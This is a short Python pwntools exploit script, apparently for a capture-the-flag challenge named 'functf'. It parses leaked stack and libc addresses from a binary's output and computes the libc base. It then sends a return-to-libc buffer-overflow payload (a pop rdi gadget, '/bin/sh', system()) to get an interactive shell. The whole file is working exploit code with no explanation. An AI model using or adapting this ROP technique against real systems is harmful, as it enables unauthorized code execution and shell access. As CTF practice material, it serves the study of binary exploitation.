from pwn import *

libc_elf = ELF("../r64.libc.so.6")
off_puts = libc_elf.sym["puts"]
off_system = libc_elf.sym["system"]
off_bin_sh = libc_elf.search("/bin/sh").next()

if len(sys.argv)==1:
    p=process("linux_server64")
    buf=p.recvuntil("1...\n")
elif sys.argv[1]=="1":
    p=process("./bin")
elif sys.argv[1]=="2":
    p=process("./bin")
elif sys.argv[1]=="3":
    p=remote("functf",18004)

buf=p.recvuntil("Input :")
print hexdump(buf)
stack_addr = int(buf[0x28:0x28+12],16)
libc_puts = int(buf[0x3d:0x3d+12],16)
libc_base = libc_puts - off_puts
print 'libc_base:',hex(libc_base)
libc_system = libc_base + off_system
libc_bin_sh = libc_base + off_bin_sh

poprdi = 0x400893

payload=""
payload+="A"*8
payload+="B"*8
payload+="C"*8
#payload+=p64(0xdeadbeef)
payload+=p64(poprdi)
payload+=p64(libc_bin_sh)
payload+=p64(libc_system)

p.sendline(payload)

p.interactive()
